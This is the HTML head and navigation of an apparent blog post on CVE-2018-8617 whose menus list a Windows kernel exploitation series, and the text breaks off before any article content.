<!doctype html>
<html
  lang="en"
  dir="ltr"
  class="scroll-smooth"
  data-default-appearance="dark"
  data-auto-appearance="true"><head>
  <meta charset="utf-8">
  
    <meta http-equiv="content-language" content="en">
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <meta name="theme-color">

  
  <title>CVE-2018-8617 Analysis &middot; </title>
    <meta name="title" content="CVE-2018-8617 Analysis &middot; ">

  
  
  
  
  
  <link rel="canonical" href="/posts/cve-2018-8617-analysis/">
  
  
  
  
  
  
  
  
  
  
    
    
  
  
  <link
    type="text/css"
    rel="stylesheet"
    href="/css/main.bundle.min.d7672814413dccdcf76c504d9b0ebb8d0f964dbe6b30a3d4b25b15809a94c2eb732d99898aded2009aacdd1fa8b17cea1369fd81560790cd355aee00bbd142fd.css"
    integrity="sha512-12coFEE9zNz3bFBNmw67jQ&#43;WTb5rMKPUslsVgJqUwutzLZmJit7SAJqs3R&#43;osXzqE2n9gVYHkM01Wu4Au9FC/Q==">

  
  
  <script
    type="text/javascript"
    src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
  
  
    
    
    
  
  
  
  
  
  
  
  
  
  
    
    <script
      defer
      type="text/javascript"
      id="script-bundle"
      src="/js/main.bundle.min.a187118b41a60744310065c567365de85730c8495301d0ebae41810cc6f7a47432b1de7d4f3b11338959f1ac50c266be6b4b73acf6bf770016eb59b602cc1aa0.js"
      integrity="sha512-oYcRi0GmB0QxAGXFZzZd6FcwyElTAdDrrkGBDMb3pHQysd59TzsRM4lZ8axQwma&#43;a0tzrPa/dwAW61m2AswaoA=="
      data-copy="Copy"
      data-copied="Copied"></script>
  
  
    
    <script src="/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js" integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7&#43;kfJ6kKCJxQGC&#43;8wm&#43;Bz9JucDjDTGNew=="></script>
  

  
  
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
  

  
  
  
  
  
  

  
  <meta property="og:url" content="/posts/cve-2018-8617-analysis/">
  <meta property="og:title" content="CVE-2018-8617 Analysis">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-10-29T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-10-29T00:00:00+00:00">
    <meta property="og:image" content="/posts/cve-2018-8617-analysis/featured.jpg">

  
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="/posts/cve-2018-8617-analysis/featured.jpg">
  <meta name="twitter:title" content="CVE-2018-8617 Analysis">
<meta name="twitter:image" content="/posts/cve-2018-8617-analysis/featured.jpg">
    <meta property="og:image" content="/posts/cve-2018-8617-analysis/featured.jpg">
  <script type="application/ld+json">
  [{
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Posts",
    "name": "CVE-2018-8617 Analysis",
    "headline": "CVE-2018-8617 Analysis",
    
    
    "inLanguage": "en",
    "url" : "\/posts\/cve-2018-8617-analysis\/",
    "author" : {
      "@type": "Person",
      "name": "wetw0rk"
    },
    "copyrightYear": "2025",
    "dateCreated": "2025-10-29T00:00:00\u002b00:00",
    "datePublished": "2025-10-29T00:00:00\u002b00:00",
    
    "dateModified": "2025-10-29T00:00:00\u002b00:00",
    
    
    
    "mainEntityOfPage": "true",
    "wordCount": "3890"
  }]
  </script>



  
  
    <meta name="author" content="wetw0rk">
  
  
    
      
        
          <link href="https://bsky.app/profile/wetw0rk7.bsky.social" rel="me">
        
      
    
      
        
          <link href="https://github.com/wetw0rk" rel="me">
        
      
    
      
        
          <link href="https://www.linkedin.com/in/milton-wetw0rk/" rel="me">
        
      
    
      
        
          <link href="https://x.com/wetw0rk7" rel="me">
        
      
    
  

  
  

<script src="/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js" integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj&#43;KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>























  
  





  
  

  
  

  
  

  
  
</head>
<body
    class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
    <div id="the-top" class="absolute flex self-center">
      <a
        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
        href="#main-content">
        <span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>
        Skip to main content
      </a>
    </div>
    
    
      













<div
  class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3 pt-[2px] pr-0 pb-[3px] pl-0">
  
  

  <div class="flex flex-1 items-center justify-between">
    <nav class="flex space-x-3">
      
        <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">
          
        </a>
      
    </nav>
    
  <nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12">
    
      
        
  <a
  href="/"
  
  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
  
  <p class="text-base font-medium" title="">
    Home
  </p>
</a>



      
        
  <div>
  <div class="cursor-pointer flex items-center nested-menu">
    
    <a
      
      class="text-base font-medium text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"
      title="">
      <p>
        Reviews
      </p>
    </a>
    <span>
      <span class="relative block icon"><svg
  xmlns="http://www.w3.org/2000/svg"
  viewBox="0 0 20 20"
  fill="currentColor"
  aria-hidden="true"
>
  <path
    fill-rule="evenodd"
    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
    clip-rule="evenodd"
  />
</svg>
</span>
    </span>
  </div>
  <div class="absolute menuhide">
    <div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl">
      <div class="flex flex-col space-y-3">
        
          <a
            href="/posts/advanced-windows-exploitation-review/"
            
            class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
            
            <p class="text-sm font-sm" title="Advanced Windows Exploitation (AWE) Review">
              Advanced Windows Exploitation (AWE)
            </p>
          </a>
        
      </div>
    </div>
  </div>
</div>



      
        
  <div>
  <div class="cursor-pointer flex items-center nested-menu">
    
    <a
      
      class="text-base font-medium text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"
      title="">
      <p>
        Study Cases
      </p>
    </a>
    <span>
      <span class="relative block icon"><svg
  xmlns="http://www.w3.org/2000/svg"
  viewBox="0 0 20 20"
  fill="currentColor"
  aria-hidden="true"
>
  <path
    fill-rule="evenodd"
    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
    clip-rule="evenodd"
  />
</svg>
</span>
    </span>
  </div>
  <div class="absolute menuhide">
    <div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl">
      <div class="flex flex-col space-y-3">
        
          <a
            href="/posts/ezekielswheel/"
            
            class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
            
            <p class="text-sm font-sm" title="Ezekiels Wheel (Hells Gate Analysis)">
              Ezekiels Wheel (Hells Gate Analysis)
            </p>
          </a>
        
          <a
            href="/posts/understanding-the-windows-_security_descriptor/"
            
            class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
            
            <p class="text-sm font-sm" title="Understanding the Windows _SECURITY_DESCRIPTOR">
              Understanding the Windows _SECURITY_DESCRIPTOR
            </p>
          </a>
        
      </div>
    </div>
  </div>
</div>



      
        
  <div>
  <div class="cursor-pointer flex items-center nested-menu">
    
    <a
      
      class="text-base font-medium text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"
      title="">
      <p>
        Windows Kernel Exploitation Series
      </p>
    </a>
    <span>
      <span class="relative block icon"><svg
  xmlns="http://www.w3.org/2000/svg"
  viewBox="0 0 20 20"
  fill="currentColor"
  aria-hidden="true"
>
  <path
    fill-rule="evenodd"
    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
    clip-rule="evenodd"
  />
</svg>
</span>
    </span>
  </div>
  <div class="absolute menuhide">
    <div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl">
      <div class="flex flex-col space-y-3">
        
          <a
            href="/posts/0x00-introduction-to-windows-kernel-exploitation/"
            
            class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
            
            <p class="text-sm font-sm" title="0x00 - Introduction to Windows Kernel Exploitation">
              0x00 - Introduction To Windows-Kernel Exploitation
            </p>
          </a>
        
          <a
            href="/posts/0x01-killing-windows-kernel-mitigations/"
            
            class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
            
            <p class="text-sm font-sm" title="0x01 - Killing Windows Kernel Mitigations">
              0x01 - Killing Windows Kernel Mitigations
            </p>
          </a>
        
          <a
            href="/posts/0x02-introduction-to-windows-kernel-uafs/"
            
            class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
            
            <p class="text-sm font-sm" title="0x02 - Introduction to Windows Kernel Use After Frees (UaFs)">
              0x02 - Introduction to Windows Kernel Use After Frees
            </p>
          </a>
        
          <a
            href="/posts/0x03-approaching-the-modern-windows-kernel-heap/"
            
            class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
            
            <p class="text-sm font-sm" title="0x03 - Approaching the Modern Windows Kernel Heap">
              0x03 - Approaching the Modern Windows Kernel Heap
            </p>
          </a>
        
          <a
            href="/posts/0x04-writing-what-where-in-the-kernel/"
            
            class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
            
            <p class="text-sm font-sm" title="0x04 - Introduction to Windows Kernel Write What Where Vulnerabilities">
              0x04 - Introduction To Windows Kernel Write What Where
            </p>
          </a>
        
          <a
            href="/posts/0x05-introduction-to-windows-kernel-type-confusion-vulnerabilities/"
            
            class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
            
            <p class="text-sm font-sm" title="0x05 - Introduction to Windows Kernel Type Confusion Vulnerabilities">
              0x05 - Introduction to Windows Kernel Type Confusion Vulnerabilities
            </p>
          </a>
        
          <a
            href="/posts/0x06-approaching-modern-windows-kernel-type-confusions/"
            
            class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
            
            <p class="text-sm font-sm" title="0x06 - Approaching Modern Windows Kernel Type Confusions">
              0x06 - Approaching Modern Windows Kernel Type Confusions
            </p>
          </a>
        
          <a
            href="/posts/0x07-introduction-to-windows-kernel-race-conditions/"
            
            class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
            
            <p class="text-sm font-sm" title="0x07 - Introduction to Windows Kernel Race Conditions">
              0x07 - Introduction to Windows Kernel Race Conditions
            </p>
          </a>
        
          <a
            href="/posts/0x08-modern-windows-kernel-race-conditions/"
            
            class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
            
            <p class="text-sm font-sm" title="0x08 - Modern Windows Kernel Race Conditions">
              0x08 - Modern Windows Kernel Race Conditions
            </p>
          </a>
        
          <a
            href="/posts/0x09-return-of-the-stack-overflow/"
            
            class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
            
            <p class="text-sm font-sm" title="0x09 - Return of the Windows Kernel Stack Overflow">
              0x09 - Return of The Stack Overflow
            </p>
          </a>
        
      </div>
    </div>
  </div>
</div>



      
    

    

    

    
      <button
        id="search-button"
        aria-label="Search"
        class="text-base hover:text-primary-600 dark:hover:text-primary-400"
        title="Search (/)">
        <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span>
      </button>
    

    
      <div class=" flex items-center">
        <button
          id="appearance-switcher"
          aria-label="Dark mode switcher"
          type="button"
          class="text-base hover:text-primary-600 dark:hover:text-primary-400">
          <div class="flex items-center justify-center dark:hidden">
            <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
</span>
          </div>
          <div class="items-center justify-center hidden dark:flex">
            <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
</span>
          </div>
        </button>
      </div>
    
  </nav>

    
  <div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12">
    <span></span>

    

    

    
      <button
        id="search-button-mobile"
        aria-label="Search"
        class="text-base hover:text-primary-600 dark:hover:text-primary-400"
        title="Search (/)">
        <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span>
      </button>
    

    
      <button
        id="appearance-switcher-mobile"
        aria-label="Dark mode switcher"
        type="button"
        class="text-base hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-1 rtl:ml-1">
        <div class="flex items-center justify-center dark:hidden">
          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
</span>
        </div>
        <div class="items-center justify-center hidden dark:flex">
          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
</span>
        </div>
      </button>
    
  </div>

  </div>
  
  <div class="-my-2 md:hidden">
    <div id="menu-button" class="block">
      
        <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
</span>
        </div>
        <div
          id="menu-wrapper"
          class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]">
          <ul
            class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
            <li id="menu-close-button">
              <span
                class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
                <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
</span>
              </span>
            </li>

            
              
  <li class="mt-1">
  <a
    href="/"
    
    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-bg font-bg" title="">
      Home
    </p>
  </a>
</li>



            
              
  <li class="mt-1">
  <a
    href=""
    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-bg font-bg" title="">
      Reviews
    </p>
    <span>
      <span class="relative block icon"><svg
  xmlns="http://www.w3.org/2000/svg"
  viewBox="0 0 20 20"
  fill="currentColor"
  aria-hidden="true"
>
  <path
    fill-rule="evenodd"
    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
    clip-rule="evenodd"
  />
</svg>
</span>
    </span>
  </a>
</li>

  <li class="mt-1">
    <a
      href="/posts/advanced-windows-exploitation-review/"
      
      class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
      
      <p class="text-sm font-small" title="Advanced Windows Exploitation (AWE) Review">
        Advanced Windows Exploitation (AWE)
      </p>
    </a>
  </li>

<li class="mb-2"></li>



            
              
  <li class="mt-1">
  <a
    href=""
    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-bg font-bg" title="">
      Study Cases
    </p>
    <span>
      <span class="relative block icon"><svg
  xmlns="http://www.w3.org/2000/svg"
  viewBox="0 0 20 20"
  fill="currentColor"
  aria-hidden="true"
>
  <path
    fill-rule="evenodd"
    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
    clip-rule="evenodd"
  />
</svg>
</span>
    </span>
  </a>
</li>

  <li class="mt-1">
    <a
      href="/posts/ezekielswheel/"
      
      class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
      
      <p class="text-sm font-small" title="Ezekiels Wheel (Hells Gate Analysis)">
        Ezekiels Wheel (Hells Gate Analysis)
      </p>
    </a>
  </li>

  <li class="mt-1">
    <a
      href="/posts/understanding-the-windows-_security_descriptor/"
      
      class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
      
      <p class="text-sm font-small" title="Understanding the Windows _SECURITY_DESCRIPTOR">
        Understanding the Windows _SECURITY_DESCRIPTOR
      </p>
    </a>
  </li>

<li class="mb-2"></li>



            
              
  <li class="mt-1">
  <a
    href=""
    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-bg font-bg" title="">
      Windows Kernel Exploitation Series
    </p>
    <span>
      <span class="relative block icon"><svg
  xmlns="http://www.w3.org/2000/svg"
  viewBox="0 0 20 20"
  fill="currentColor"
  aria-hidden="true"
>
  <path
    fill-rule="evenodd"
    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
    clip-rule="evenodd"
  />
</svg>
</span>
    </span>
  </a>
</li>

  <li class="mt-1">
    <a
      href="/posts/0x00-introduction-to-windows-kernel-exploitation/"
      
      class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
      
      <p class="text-sm font-small" title="0x00 - Introduction to Windows Kernel Exploitation">
        0x00 - Introduction To Windows-Kernel Exploitation
      </p>
    </a>
  </li>

  <li class="mt-1">
    <a
      href="/posts/0x01-killing-windows-kernel-mitigations/"
      
      class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
      
      <p class="text-sm font-small" title="0x01 - Killing Windows Kernel Mitigations">
        0x01 - Killing Windows Kernel Mitigations
      </p>
    </a>
  </li>

  <li class="mt-1">
    <a
      href="/posts/0x02-introduction-to-windows-kernel-uafs/"
      
      class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
      
      <p class="text-sm font-small" title="0x02 - Introduction to Windows Kernel Use After Frees (UaFs)">
        0x02 - Introduction to Windows Kernel Use After Frees
      </p>
    </a>
  </li>

  <li class="mt-1">
    <a
      href="/posts/0x03-approaching-the-modern-windows-kernel-heap/"
      
      class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
      
      <p class="text-sm font-small" title="0x03 - Approaching the Modern Windows Kernel Heap">
        0x03 - Approaching the Modern Windows Kernel Heap
      </p>
    </a>
  </li>

  <li class="mt-1">
    <a
      href="/posts/0x04-writing-what-where-in-the-kernel/"
      
      class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
      
      <p class="text-sm font-small" title="0x04 - Introduction to Windows Kernel Write What Where Vulnerabilities">
        0x04 - Introduction To Windows Kernel Write What Where
      </p>
    </a>
  </li>

  <li class="mt-1">
    <a
      href="/posts/0x05-introduction-to-windows-kernel-type-confusion-vulnerabilities/"
      
      class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
      
      <p class="text-sm font-small" title="0x05 - Introduction to Windows Kernel Type Confusion Vulnerabilities">
        0x05 - Introduction to Windows Kernel Type Confusion Vulnerabilities
      </p>
    </a>
  </li>

  <li class="mt-1">
    <a
      href="/posts/0x06-approaching-modern-windows-kernel-type-confusions/"
      
      class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
      
      <p class="text-sm font-small" title="0x06 - Approaching Modern Windows Kernel Type Confusions">
        0x06 - Approaching Modern Windows Kernel Type Confusions
      </p>
    </a>
  </li>

  <li class="mt-1">
    <a
      href="/posts/0x07-introduction-to-windows-kernel-race-conditions/"
      
      class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
      
      <p class="text-sm font-small" title="0x07 - Introduction to Windows Kernel Race Conditions">
        0x07 - Introduction to Windows Kernel Race Conditions
      </p>
    </a>
  </li>

  <li class="mt-1">
    <a
      href="/posts/0x08-modern-windows-kernel-race-conditions/"
      
      class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
      
      <p class="text-sm font-small" title="0x08 - Modern Windows Kernel Race Conditions">
        0x08 - Modern Windows Kernel Race Conditions
      </p>
    </a>
  </li>

  <li class="mt-1">
    <a
      href="/posts/0x09-return-of-the-stack-overflow/"
      
      class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
      
      <p class="text-sm font-small" title="0x09 - Return of the Windows Kernel Stack Overflow">
        0x09 - Return of The Stack Overflow
      </p>
    </a>
  </li>

<li class="mb-2"></li>



            

          </ul>
          
        </div>
      
    </div>
  </div>

</div>





    
    <div class="relative flex flex-col grow">
      <main id="main-content" class="grow">
        
  
  <article>
    
    

    
    <header id="single_header" class="mt-5 max-w-prose">
      
      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
        CVE-2018-8617 Analysis
      </h1>
      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
        





  
  



  

  
  
  

  
  
    
  

  

  

  

  
    
  

  

  

  

  

  


  <div class="flex flex-row flex-wrap items-center">
    
    
      <span title="Reading time">19 mins</span>
    

    
    
  </div>

  

  
  

  
  



      </div>
      
        
  
  
  
  
  
  

  

  
    
    
<div class="flex author">
  
    
    
      
    
    
      
        
      
      <img
        class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4"
        width="96"
        height="96"
        alt="wetw0rk"
        src="/img/me_hu_1a0930eb08f79e88.png">
    
  
  <div class="place-self-center">
    
      <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
        Author
      </div>
      <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
        wetw0rk
      </div>
    
    
    <div class="text-2xl sm:text-lg">
  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="https://bsky.app/profile/wetw0rk7.bsky.social"
          target="_blank"
          aria-label="Bluesky"
          rel="me noopener noreferrer"
          ><span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256,232.562c-21.183,-41.196 -78.868,-117.97 -132.503,-155.834c-51.378,-36.272 -70.978,-29.987 -83.828,-24.181c-14.872,6.72 -17.577,29.554 -17.577,42.988c0,13.433 7.365,110.138 12.169,126.281c15.873,53.336 72.376,71.358 124.413,65.574c2.66,-0.395 5.357,-0.759 8.089,-1.097c-2.68,0.429 -5.379,0.796 -8.089,1.097c-76.259,11.294 -143.984,39.085 -55.158,137.972c97.708,101.165 133.908,-21.692 152.484,-83.983c18.576,62.291 39.972,180.718 150.734,83.983c83.174,-83.983 22.851,-126.674 -53.408,-137.969c-2.71,-0.302 -5.409,-0.667 -8.089,-1.096c2.732,0.337 5.429,0.702 8.089,1.096c52.037,5.785 108.54,-12.239 124.413,-65.574c4.804,-16.142 12.169,-112.847 12.169,-126.281c-0,-13.434 -2.705,-36.267 -17.577,-42.988c-12.85,-5.806 -32.45,-12.09 -83.829,24.181c-53.634,37.864 -111.319,114.635 -132.502,155.831Z"/></svg></span></span></a
        >
      
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
